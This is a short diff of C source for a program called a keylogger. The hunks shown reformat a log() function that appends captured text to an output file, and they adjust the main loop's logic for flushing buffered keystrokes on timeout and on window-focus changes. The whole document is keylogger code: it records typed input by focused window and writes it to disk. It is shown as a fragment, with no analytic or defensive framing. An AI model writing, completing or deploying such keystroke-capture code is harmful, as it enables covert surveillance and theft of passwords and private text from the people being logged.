@@ -58,8 +58,8 @@ void log(const char * fmt, ...) {
     strcat(logbuf, "\n");
 
     if ((file = fopen(outputfile, "a+")) != NULL) {
-        fputs( logbuf, file );
-        fclose( file );
+        fputs(logbuf, file);
+        fclose(file);
     }
 }
 
@@ -98,12 +98,11 @@ void keylogger() {
 
     int logging = 0;
 
-    while(1)
-    { 
+    while(1) { 
 
         usleep(SLEEP);
 
-        if ((logging == 1) && ((time(NULL) > timeout) || (focusWin != oldfocusWin))) {
+        if ((logging == 1) && (time(NULL) > timeout)) {
             logging = 0;
             log(" [%x] %s\n", focusWin, b->buffer);
             emptyData(b);
@@ -159,7 +158,7 @@ void keylogger() {
                         }
 
                         if (focusWin != oldfocusWin) {
-                            log("change [%x] %s\n", focusWin, b->buffer);
+                            log("[window changed] %s\n", b->buffer);
                             emptyData(b);
                         }
 
